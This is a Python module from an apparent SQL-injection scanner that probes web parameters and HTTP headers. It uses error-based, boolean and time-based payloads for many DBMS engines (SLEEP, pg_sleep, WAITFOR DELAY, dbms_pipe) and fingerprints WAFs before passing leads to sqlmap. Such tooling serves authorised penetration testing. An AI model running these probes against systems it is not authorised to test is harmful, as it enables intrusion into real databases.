"""Heuristic pre-screening for SQL injection.

This is a *fast, low-noise* filter that runs before sqlmap. It injects a small
set of probe payloads into each discovered parameter (and into suspicious HTTP
headers) and looks for:

  * DBMS error messages leaked in the response body (error-based hint), using
    an extended signature set that covers MySQL/MariaDB, PostgreSQL, MSSQL,
    SQLite, Oracle, DB2, Informix, Firebird and generic JDBC/ODBC/PDO stacks
  * boolean divergence between a TRUE and FALSE condition - byte-exact (hash)
    or, for pages with dynamic noise (nonces, ads, rotating content),
    *similarity-based* via sequence matching
  * a measurable time delay for sleep-style payloads across DBMS engines
    (MySQL/MariaDB, PostgreSQL, MSSQL, Oracle, SQLite)
  * SQLi surfaced through HTTP headers (User-Agent, Referer, X-Forwarded-For,
    Cookie, ...) for endpoints that log or reflect header values into queries
  * WAF/edge presence: passive fingerprinting (headers, cookies, body markers)
    plus an active probe that records when the target starts blocking

A positive heuristic result is only a *lead*. sqlmap (``core.exploit``) remains
the source of truth for confirmation.
"""

from __future__ import annotations

import difflib
import hashlib
import re
import time
from dataclasses import dataclass, field
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

import requests

from core.param_discovery import Target, rank_params
from utils.logger import get_logger
from utils.rate_limit import RateLimiter

log = get_logger("sofia-sqli.detector")

# Built-in, DBMS-agnostic SQL error signatures. These are always applied on top
# of any user-supplied ``sqli.error_signatures`` so that common backend errors
# are never missed just because the config list is incomplete. Matching is
# case-insensitive regex against the response body.
DEFAULT_ERROR_SIGNATURES = (
    # --- MySQL / MariaDB ---
    "you have an error in your sql syntax",
    "warning: mysql",
    "warning: mysqli",
    "mysql_fetch_(?:array|assoc|object|row)\\(\\)",
    "mysql_num_rows\\(\\)",
    "supplied argument is not a valid mysql",
    "mysqli_sql_exception",
    "mysqli?::",
    "mariadb server version",
    "unknown column",
    # --- MSSQL / Sybase ---
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "microsoft ole db provider for sql server",
    "odbc sql server driver",
    "incorrect syntax near",
    "microsoft sql server",
    "sqlserverexception",
    "system\\.data\\.sqlclient",
    "com\\.microsoft\\.sqlserver",
    "sqlexception",
    "conversion failed when (?:converting|parsing) (?:the )?(?:\\w+ )?value",
    "must declare the scalar variable",
    "invalid column name",
    # --- PostgreSQL ---
    "pg_query\\(\\)",
    "pg_exec\\(\\)",
    "postgresql.*error",
    "syntax error at or near",
    "unterminated quoted string at or near",
    "pg::(?:syntaxerror|connectionerror|invalidtextrepresentation)",
    "org\\.postgresql\\.util\\.psqlexception",
    "invalid input syntax for (?:type )?(?:integer|numeric|uuid|boolean|date)",
    "relation \".*\" does not exist",
    # --- SQLite ---
    "sqlite3\\.(?:operationalerror|syntaxerror|databaseerror|programmingerror)",
    "sql logic error",
    "unrecognized token",
    "no such (?:column|table|function)",
    "malformed database schema",
    "near \".*\": syntax error",
    "warning: sqlite_",
    # --- Oracle ---
    "ora-\\d{5}",
    "oracle\\.jdbc",
    "oracle error",
    # --- DB2 ---
    "db2 sql error",
    "sqlcode=\\-?\\d+",
    "db2_(?:prepare|exec|execute)\\(\\)",
    # --- Informix ---
    "a syntax error has occurred",
    # --- Firebird / InterBase ---
    "dynamic sql error",
    "sql error code =",
    "interbase",
    # --- Generic stacks / drivers ---
    "sqlstate\\[?[0-9a-z]{5}",
    "jdbc.*sqlexception",
    "odbc (?:driver|error)",
    "microsoft access driver",
    "microsoft jet database engine",
    "syntax error in query",
    "pdoexception",
    "pdo::",
    "sql syntax",
    "database error",
    "fatal.*sql",
    "hibernate.*sqlexception",
    "nhibernate\\.exceptions",
)

# Sleep-style probe templates per DBMS engine. Each template may reference
# ``{n}`` (sleep seconds) and ``{v}`` (the baseline value). When ``{v}`` is not
# present in the template the baseline value is prepended automatically.
# The SQLite entry is a best-effort CPU-burning query (SQLite has no sleep
# primitive); tune its blob size via the ``{n}`` multiplier if needed.
DEFAULT_TIME_PROBES: dict[str, str] = {
    "mysql": "' AND SLEEP({n})-- -",
    "mysql2": "' AND (SELECT SLEEP({n}))-- -",
    "mysql_bare": " AND SLEEP({n})",
    "postgres": "'; SELECT pg_sleep({n})-- -",
    "postgres2": "'||(SELECT pg_sleep({n}))-- -",
    "mssql": "'; WAITFOR DELAY '0:0:{n}'-- -",
    "mssql2": "' WAITFOR DELAY '0:0:{n}'-- -",
    "oracle": "' AND (SELECT dbms_pipe.receive_message(CHR(68)||CHR(66),{n}) FROM dual) IS NOT NULL-- -",
    "sqlite": "' AND (SELECT COUNT(*) FROM sqlite_master AS a, sqlite_master AS b WHERE randomblob({n}00000000))",
}

# Headers worth probing for header-based SQLi (reflected into queries, logs,
# audit tables...). Configurable via ``sqli.header_probe.headers``.
DEFAULT_HEADER_NAMES = (
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Forwarded-Host",
    "Accept-Language",
    "Cookie",
    "X-Real-IP",
    "X-Client-IP",
    "X-Requested-With",
    "Origin",
    "Forwarded",
    "X-Api-Version",
)

# Passive + active WAF fingerprints: name -> {headers, cookies, body} markers.
# All matching is lowercase substring matching. ``headers`` entries may use
# ``name:value`` syntax to match a specific header value, or just ``name`` to
# match the header key (or the raw header blob, for fingerprints like
# ``server: cloudflare`` that need the value).
WAF_SIGNATURES: dict[str, dict[str, tuple[str, ...]]] = {
    "Cloudflare": {
        "headers": ("cf-ray", "cf-cache-status", "cf-mitigated", "server: cloudflare"),
        "cookies": ("__cf_bm", "__cfduid", "cf_chl_", "cf_clearance"),
        "body": ("attention required! | cloudflare", "cloudflare ray id",
                 "just a moment...", "checking if the site connection is secure"),
    },
    "AWS WAF": {
        "cookies": ("awswaf",),
        "body": ("aws waf", "captcha required", "request blocked. your request has been blocked"),
    },
    "Imperva/Incapsula": {
        "headers": ("x-iinfo", "x-cdn: imperva", "x-cdn: incapsula"),
        "cookies": ("incap_ses", "visid_incap"),
        "body": ("request unsuccessful. incapsula", "incapsula incident id", "imperva"),
    },
    "Akamai": {
        "headers": ("x-akamai-transformed", "server: akamaighost", "akamai-grn",
                    "x-akamai-request-id"),
        "body": ("akamai reference number",),
    },
    "Sucuri": {
        "headers": ("x-sucuri-id", "x-sucuri-cache"),
        "cookies": ("sucuri_cloudproxy_uuid",),
        "body": ("sucuri website firewall", "cloudproxy access denied"),
    },
    "ModSecurity": {
        "headers": ("x-mod-security",),
        "body": ("mod_security", "modsecurity"),
    },
    "F5 BIG-IP": {
        "headers": ("x-cdn: f5", "server: bigip"),
        "cookies": ("bigipserver", "f5_cspm", "f5avra_", "ts="),
        "body": ("the requested url was rejected", "f5 big-ip", "support id:"),
    },
    "Barracuda": {
        "headers": ("x-barracuda",),
        "cookies": ("barra_",),
        "body": ("barracuda",),
    },
    "FortiWeb": {
        "headers": ("x-fortiwaf",),
        "body": ("fortiweb",),
    },
    "Naxsi": {
        "headers": ("x-naxsi-signature",),
        "body": ("naxsi",),
    },
    "Wallarm": {
        "headers": ("x-wallarm",),
    },
    "Aliyun WAF": {
        "headers": ("server: yundun",),
        "cookies": ("aliyungf", "acw_sc__"),
        "body": ("yundun", "aliyun waf"),
    },
    "DDoS-Guard": {
        "headers": ("server: ddos-guard",),
        "cookies": ("ddos-",),
    },
    "StackPath": {
        "headers": ("stackpath",),
        "cookies": ("stackpath",),
    },
    "Reblaze": {
        "cookies": ("rebl_",),
    },
    "ASP.NET Request Validation": {
        "body": ("potentially dangerous request", "asp.net has detected"),
    },
    "Wordfence": {
        "body": ("wordfence",),
    },
}

# Status codes that usually mean an edge/WAF blocked the request.
WAF_BLOCK_STATUSES = frozenset({403, 405, 406, 409, 418, 429, 499, 520})

# Cap on the text length used for boolean similarity comparisons (keeps the
# O(n*m) SequenceMatcher cost bounded on very large pages).
_SIM_TEXT_LIMIT = 20000

_MAX_EVIDENCE_SNIPPET = 200


@dataclass
class ParamHit:
    """A per-parameter (or per-header) heuristic observation."""

    name: str
    place: str            # GET | POST | HEADER:<Name>
    signals: list[str] = field(default_factory=list)
    evidence: list[str] = field(default_factory=list)
    score: int = 0

    @property
    def strong(self) -> bool:
        return self.score >= 2


@dataclass
class WafInfo:
    """Result of passive + active WAF/edge detection."""

    name: str = ""                # best-known product name ("", "Cloudflare", ...)
    detected: bool = False        # any fingerprint seen (even on normal traffic)
    blocked: bool = False         # an active probe was actually blocked
    reasons: list[str] = field(default_factory=list)


@dataclass
class DetectionResult:
    """Aggregate heuristic result for one target."""

    target: Target
    hit: bool = False
    hits: list[ParamHit] = field(default_factory=list)
    blocked: bool = False
    waf: WafInfo | None = None
    error: str = ""

    @property
    def candidate_params(self) -> list[str]:
        return [h.name for h in self.hits]

    @property
    def dbms_hints(self) -> list[str]:
        """DBMS names hinted by successful time probes, e.g. ``["mysql"]``."""
        out: list[str] = []
        for h in self.hits:
            for s in h.signals:
                if s.startswith("time-based"):
                    hint = s[len("time-based"):].strip(" ()").replace("(header)", "header")
                    if hint:
                        out.append(hint)
        return out

    def best_reason(self) -> str:
        if self.blocked:
            waf = f" ({self.waf.name})" if self.waf and self.waf.name else ""
            return f"WAF/edge blocked automated probes{waf}"
        if not self.hits:
            return "No heuristic signal"
        best = max(self.hits, key=lambda h: h.score)
        joined = ", ".join(best.signals) if best.signals else "signal"
        return f"param '{best.name}' ({best.place}): {joined}"


class HeuristicDetector:
    """Run lightweight SQLi probes against a target's parameters and headers."""

    def __init__(self, cfg: dict, session: requests.Session | None = None):
        self.cfg = cfg or {}
        sqli = self.cfg.get("sqli", {}) or {}
        gen = self.cfg.get("general", {}) or {}

        self.payloads = list(sqli.get("heuristic_payloads") or ["'", '"', "')"])
        # User signatures first, then the built-in set (dedup while preserving order).
        sig_texts: list[str] = []
        for s in list(sqli.get("error_signatures") or []) + list(DEFAULT_ERROR_SIGNATURES):
            if s not in sig_texts:
                sig_texts.append(s)
        self.error_sigs = [re.compile(s, re.IGNORECASE) for s in sig_texts]
        self.timeout = float(gen.get("timeout", 20))
        self.user_agent = gen.get("user_agent", "Mozilla/5.0")

        # ---- boolean similarity thresholds ---------------------------------
        bool_cfg = sqli.get("boolean") or {}
        self.sim_true = float(bool_cfg.get("similarity_true", 0.98))
        self.sim_false = float(bool_cfg.get("similarity_false", 0.92))
        self.sim_margin = float(bool_cfg.get("margin", 0.03))

        # ---- time probes (multi-DBMS) --------------------------------------
        time_cfg = sqli.get("time_probe") or {}
        if isinstance(time_cfg, str):            # legacy single-probe config
            time_cfg = {"probes": {"custom": time_cfg}}
        self.enable_time = bool(time_cfg.get("enabled", sqli.get("enable_time_probe", True)))
        self.sleep_seconds = int(time_cfg.get("sleep_seconds", sqli.get("sleep_seconds", 4)))
        self.time_threshold = float(time_cfg.get("threshold_factor", 0.8))
        self.stop_on_first_time = bool(time_cfg.get("stop_on_first_hit", True))
        probes = time_cfg.get("probes")
        if not probes:                    # None, {} or empty -> legacy/default
            probes = sqli.get("time_probes")
        if not probes:
            probes = dict(DEFAULT_TIME_PROBES)
        elif isinstance(probes, str):
            probes = {"custom": probes}
        self.time_probes: list[tuple[str, str]] = [(str(k), str(v)) for k, v in dict(probes).items()]

        # ---- header probe ---------------------------------------------------
        hcfg = sqli.get("header_probe") or {}
        self.enable_header = bool(hcfg.get("enabled", True))
        self.header_names: tuple[str, ...] = tuple(
            hcfg.get("headers") or DEFAULT_HEADER_NAMES)
        self.header_time = bool(hcfg.get("time_probe", True))

        # ---- WAF detection ---------------------------------------------------
        wcfg = sqli.get("waf") or {}
        self.waf_enabled = bool(wcfg.get("enabled", True))
        self.waf_active = bool(wcfg.get("active_probe", True))
        self.waf_block_statuses = frozenset(
            wcfg.get("block_statuses") or WAF_BLOCK_STATUSES)
        self.waf_signatures: dict[str, dict[str, tuple[str, ...]]] = dict(WAF_SIGNATURES)
        for name, sigs in (wcfg.get("signatures") or {}).items():
            merged = dict(self.waf_signatures.get(name, {}))
            for kind in ("headers", "cookies", "body"):
                merged[kind] = tuple(merged.get(kind, ())) + tuple(sigs.get(kind) or ())
            self.waf_signatures[name] = merged

        self.limiter = RateLimiter(min_interval=float(sqli.get("probe_interval", 0.3)))

        # Status codes coi la "block" cho blanket-block detection trong check()
        # (sqli.blocked_statuses trong settings.yaml; rong/mac loi = 403/406/429).
        try:
            self.probe_block_statuses = tuple(
                int(x) for x in (sqli.get("blocked_statuses") or (403, 406, 429)))
        except (TypeError, ValueError):
            self.probe_block_statuses = (403, 406, 429)
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": self.user_agent})

    # ------------------------------------------------------------ primitives
    def _send(self, target: Target, param: str, value: str, place: str) -> requests.Response | None:
        headers = {"User-Agent": self.user_agent, **target.headers}
        try:
            self.limiter.acquire()
            if place == "POST":
                pairs = dict(parse_qsl(target.data, keep_blank_values=True)) if target.data else {}
                pairs[param] = value
                return self.session.post(target.url, data=pairs, headers=headers,
                                          timeout=self.timeout, allow_redirects=True)
            parts = urlparse(target.url)
            pairs = dict(parse_qsl(parts.query, keep_blank_values=True))
            pairs[param] = value
            new = urlunparse((parts.scheme, parts.netloc, parts.path, parts.params,
                              urlencode(pairs), ""))
            return self.session.get(new, headers=headers, timeout=self.timeout,
                                    allow_redirects=True)
        except requests.RequestException as exc:
            log.debug("probe error %s [%s]: %s", target.url, param, exc)
            return None

    def _send_headers(self, target: Target, override: dict[str, str]) -> requests.Response | None:
        """Send the target request as-is but with specific headers replaced."""
        headers = {"User-Agent": self.user_agent,
                   **self._default_header_values(target),
                   **target.headers,
                   **override}
        try:
            self.limiter.acquire()
            if target.method.upper() == "POST":
                return self.session.post(target.url, data=target.data or None,
                                         headers=headers, timeout=self.timeout,
                                         allow_redirects=True)
            return self.session.get(target.url, headers=headers, timeout=self.timeout,
                                    allow_redirects=True)
        except requests.RequestException as exc:
            log.debug("header probe error %s: %s", target.url, exc)
            return None

    def _default_header_values(self, target: Target) -> dict[str, str]:
        """Safe per-header values used as the header-probe baseline."""
        try:
            parts = urlparse(target.url)
        except ValueError:
            parts = urlparse("http://invalid.invalid")
        host = parts.netloc
        defaults = {
            "User-Agent": self.user_agent,
            "Referer": target.url,
            "X-Forwarded-For": "127.0.0.1",
            "X-Forwarded-Host": host,
            "Forwarded": f"for=127.0.0.1;host={host}",
            "Accept-Language": "en-US,en;q=0.9",
            "X-Real-IP": "127.0.0.1",
            "X-Client-IP": "127.0.0.1",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": f"{parts.scheme}://{host}",
            "X-Api-Version": "1.0",
            "Cookie": "",
        }
        out = {k: v for k, v in defaults.items() if k in self.header_names}
        # Explicit target headers (e.g. a Cookie from targets.txt) win.
        for k, v in target.headers.items():
            if k in out or k in self.header_names:
                out[k] = v
        return out

    @staticmethod
    def _baseline_value(target: Target, param: str, place: str) -> str:
        source = target.data if place == "POST" else urlparse(target.url).query
        for k, v in parse_qsl(source, keep_blank_values=True):
            if k == param:
                # An injection needs a numeric-ish seed; fall back to "1".
                return v if v.isdigit() else "1"
        return "1"

    @staticmethod
    def _format_probe(template: str, base_value: str, seconds: int) -> str:
        """Expand a payload template with {n} (seconds) and {v} (value)."""
        filled = template.replace("{n}", str(seconds))
        if "{v}" in filled:
            return filled.replace("{v}", base_value)
        return f"{base_value}{filled}"

    def _match_error(self, text: str) -> str | None:
        if not text:
            return None
        for sig in self.error_sigs:
            m = sig.search(text)
            if m:
                return m.group(0)[:_MAX_EVIDENCE_SNIPPET]
        return None

    @staticmethod
    def _similarity(a: str, b: str) -> float:
        """Ratio of similarity between two page bodies (0.0 .. 1.0)."""
        if not a or not b:
            return 0.0
        matcher = difflib.SequenceMatcher(None, a[:_SIM_TEXT_LIMIT], b[:_SIM_TEXT_LIMIT])
        return matcher.ratio()

    # ------------------------------------------------------------- per-param
    def probe_param(self, target: Target, param: str, place: str) -> ParamHit | None:
        base_value = self._baseline_value(target, param, place)

        # 1) Baseline.
        baseline = self._send(target, param, base_value, place)
        if baseline is None:
            return None
        base_hash = hashlib.md5(baseline.content).hexdigest()
        base_len = len(baseline.content)
        base_err = self._match_error(baseline.text)

        hit = ParamHit(name=param, place=place)

        # 2) Error-based probes.
        for payload in self.payloads:
            resp = self._send(target, param, f"{base_value}{payload}", place)
            if resp is None:
                continue
            err = self._match_error(resp.text)
            if err and err != base_err:
                hit.score += 2
                hit.signals.append("error-based")
                hit.evidence.append(f"payload={base_value}{payload} -> error: {err}")
                break

        # 3) Boolean-based probes (difference between TRUE and FALSE).
        true_resp = self._send(target, param, f"{base_value} AND 1=1", place)
        false_resp = self._send(target, param, f"{base_value} AND 1=2", place)
        if true_resp is not None and false_resp is not None:
            t_hash = hashlib.md5(true_resp.content).hexdigest()
            f_hash = hashlib.md5(false_resp.content).hexdigest()
            t_len, f_len = len(true_resp.content), len(false_resp.content)
            len_delta = abs(t_len - f_len)
            sim_true = self._similarity(true_resp.text, baseline.text)
            sim_false = self._similarity(false_resp.text, baseline.text)
            if t_hash != f_hash and t_hash == base_hash:
                # The TRUE condition reproduces the baseline byte-for-byte while
                # FALSE differs: a strong, low-noise boolean signal. We do NOT
                # gate this on a fixed length delta, since a valid response can
                # legitimately shrink by only a few bytes (e.g. an empty row set).
                hit.score += 2
                hit.signals.append("boolean-based")
                hit.evidence.append(
                    f"TRUE reproduces baseline; FALSE differs "
                    f"(TRUE={t_len}B/False={f_len}B, delta {len_delta}B)")
            elif (t_hash != f_hash and sim_true >= self.sim_true
                  and sim_false <= self.sim_false
                  and (sim_true - sim_false) >= self.sim_margin):
                # Similarity-based boolean: TRUE is nearly identical to the
                # baseline while FALSE clearly diverges. Works even when the
                # page embeds nonces/ads so hashes never match.
                hit.score += 2
                hit.signals.append("boolean-similarity")
                hit.evidence.append(
                    f"TRUE ~ baseline ({sim_true:.3f}), FALSE diverges "
                    f"({sim_false:.3f}; TRUE={t_len}B/False={f_len}B)")
            elif t_hash != f_hash and (len_delta > 200 or (sim_true - sim_false) >= 0.05):
                hit.score += 1
                hit.signals.append("boolean-diff")
                hit.evidence.append(
                    f"TRUE/FALSE diverge (TRUE={t_len}B/False={f_len}B, "
                    f"sim TRUE={sim_true:.3f}/FALSE={sim_false:.3f})")

        # 4) Time-based probes across DBMS engines (optional, slower).
        if self.enable_time and self.time_probes:
            for dbms, template in self.time_probes:
                payload = self._format_probe(template, base_value, self.sleep_seconds)
                t0 = time.monotonic()
                timed = self._send(target, param, payload, place)
                elapsed = time.monotonic() - t0
                if timed is not None and elapsed >= self.sleep_seconds * self.time_threshold:
                    hit.score += 3
                    hit.signals.append(f"time-based ({dbms})")
                    hit.evidence.append(
                        f"payload {payload!r} added ~{elapsed:.1f}s "
                        f"(baseline request was fast)")
                    if self.stop_on_first_time:
                        break

        if hit.score > 0:
            log.debug("heuristic hit %s [%s,%s] score=%d signals=%s",
                      target.url, param, place, hit.score, hit.signals)
            return hit
        return None

    # ---------------------------------------------------------- header probe
    def probe_headers(self, target: Target) -> list[ParamHit]:
        """Probe configured HTTP headers for header-based SQLi.

        For each header a baseline-safe value is replaced by value + "'" and
        the response is checked for new SQL error text; optionally a MySQL-style
        SLEEP payload is appended to detect time-based header injection.
        """
        hits: list[ParamHit] = []
        if not self.enable_header or not self.header_names:
            return hits

        base_values = self._default_header_values(target)
        baseline = self._send_headers(target, {})
        if baseline is None:
            return hits
        base_err = self._match_error(baseline.text)

        time_template = self.time_probes[0][1] if self.time_probes else ""

        for name in self.header_names:
            if name not in base_values:
                continue
            original = base_values.get(name, "")
            hit: ParamHit | None = None

            # Error-based header probe.
            resp = self._send_headers(target, {name: f"{original}'"})
            if resp is not None:
                err = self._match_error(resp.text)
                if err and err != base_err:
                    hit = ParamHit(name=name, place=f"HEADER:{name}", score=2)
                    hit.signals.append("header-error")
                    hit.evidence.append(
                        f"header {name}={original!r}+\"'\" -> error: {err}")

            # Time-based header probe (first configured template, usually MySQL).
            if self.enable_time and self.header_time and time_template:
                payload = original + self._format_probe(time_template, "", self.sleep_seconds)
                t0 = time.monotonic()
                tresp = self._send_headers(target, {name: payload})
                elapsed = time.monotonic() - t0
                if tresp is not None and elapsed >= self.sleep_seconds * self.time_threshold:
                    hit = hit or ParamHit(name=name, place=f"HEADER:{name}")
                    hit.score += 3
                    hit.signals.append("time-based (header)")
                    hit.evidence.append(
                        f"header {name} payload delayed ~{elapsed:.1f}s")

            if hit:
                log.debug("header hit %s [%s] score=%d signals=%s",
                          target.url, name, hit.score, hit.signals)
                hits.append(hit)
        return hits

    # ---------------------------------------------------------- WAF detection
    @classmethod
    def _fingerprint_response(cls, resp: requests.Response) -> list[str]:
        """Return ``Name:kind marker`` fingerprints found in a response."""
        found: list[str] = []
        header_blob = " ".join(f"{k.lower()}: {str(v).lower()}"
                               for k, v in resp.headers.items())
        cookies = " ".join(f"{c.name}: {c.value}".lower() for c in resp.cookies)
        body = (resp.text or "")[:20000].lower()
        for name, sigs in WAF_SIGNATURES.items():
            for h in sigs.get("headers", ()):
                if h in header_blob:
                    found.append(f"{name}:header {h}")
            for c in sigs.get("cookies", ()):
                if c in cookies or c in header_blob:
                    found.append(f"{name}:cookie {c}")
            for b in sigs.get("body", ()):
                if b in body:
                    found.append(f"{name}:body {b!r}")
        return found

    @staticmethod
    def _waf_name_from_reasons(reasons: list[str]) -> str:
        counts: dict[str, int] = {}
        for r in reasons:
            name = r.split(":", 1)[0]
            counts[name] = counts.get(name, 0) + 1
        if not counts:
            return ""
        return max(counts.items(), key=lambda kv: (kv[1], kv[0]))[0]

    def detect_waf(self, target: Target) -> WafInfo:
        """Passively fingerprint edge/WAF presence and actively test blocking.

        * Passive: one benign request; any WAF fingerprint (headers, cookies,
          body markers) is recorded as ``detected``.
        * Active: one SQLi-looking probe (first parameter, or the User-Agent
          header when the URL has no parameters). Blocking status codes, a
          challenge page, or a *new* fingerprint that only appears on the
          hostile request marks the target as ``blocked``.
        """
        info = WafInfo()
        if not self.waf_enabled:
            return info

        baseline = self._send_headers(target, {})
        base_fp: set[str] = set()
        if baseline is not None:
            base_fp = set(self._fingerprint_response(baseline))
            info.reasons.extend(f"passive:{r}" for r in sorted(base_fp))

        if not self.waf_active:
            info.name = self._waf_name_from_reasons(info.reasons)
            info.detected = bool(info.name)
            return info

        # Active probe: first ranked parameter, else a hostile User-Agent.
        active: requests.Response | None = None
        params = rank_params(target.params) if target.params else []
        if params:
            place = target.method.upper()
            seed = self._baseline_value(target, params[0], place)
            active = self._send(target, params[0], f"{seed}' AND 1=1-- -", place)
        else:
            hostile = dict(self._default_header_values(target))
            ua = hostile.get("User-Agent", self.user_agent)
            hostile["User-Agent"] = f"{ua}' AND 1=1-- -"
            active = self._send_headers(target, hostile)

        if active is not None:
            fps = self._fingerprint_response(active)
            new_fp = [f for f in fps if f not in base_fp]
            blocked_status = active.status_code in self.waf_block_statuses
            challenged = self._is_challenge(active.text)
            if blocked_status:
                info.reasons.append(f"active:status={active.status_code}")
            if challenged:
                info.reasons.append("active:challenge-page")
            info.reasons.extend(f"active:{f}" for f in sorted(new_fp))
            info.blocked = blocked_status or challenged or bool(new_fp)

        info.name = self._waf_name_from_reasons(info.reasons)
        info.detected = bool(info.name) or info.blocked
        if info.detected:
            log.debug("WAF detection on %s: name=%s blocked=%s reasons=%s",
                      target.url, info.name or "unknown", info.blocked,
                      info.reasons[:8])
        return info

    # --------------------------------------------------------------- target
    def check(self, target: Target) -> DetectionResult:
        result = DetectionResult(target=target)
        params = rank_params(target.params) if target.params else []

        # 0) WAF/edge detection first: a blocked target would poison every
        #    subsequent probe, so short-circuit and report it.
        waf = self.detect_waf(target)
        result.waf = waf
        if waf.blocked:
            result.blocked = True
            log.info("WAF/edge detected on %s (%s) - skipping probes",
                     target.url, waf.name or "unknown")
            return result

        # 1) Header probe - works even when the URL carries no parameters.
        if self.enable_header:
            result.hits.extend(self.probe_headers(target))

        if not params:
            if not result.hits:
                result.error = "no parameters to test"
            result.hit = bool(result.hits)
            return result

        place = target.method.upper()
        blocked_hits = 0
        for param in params:
            hit = self.probe_param(target, param, place)
            if hit:
                result.hits.append(hit)
            else:
                # Detect a blanket block (every probe answered with a block
                # status - sqli.blocked_statuses, default 403/406/429).
                resp = self._send(target, param, "1'", place)
                if resp is not None and resp.status_code in self.probe_block_statuses:
                    blocked_hits += 1
                elif resp is not None and self._is_challenge(resp.text):
                    blocked_hits += 1

        result.hit = bool(result.hits)
        if not result.hits and blocked_hits >= max(1, len(params)):
            result.blocked = True
        return result

    @staticmethod
    def _is_challenge(text: str) -> bool:
        if not text:
            return False
        low = text[:4000].lower()
        needles = ("cloudflare", "captcha", "access denied", "just a moment",
                   "attention required", "request blocked", "incapsula incident",
                   "sucuri website firewall", "your request was blocked")
        return any(n in low for n in needles)
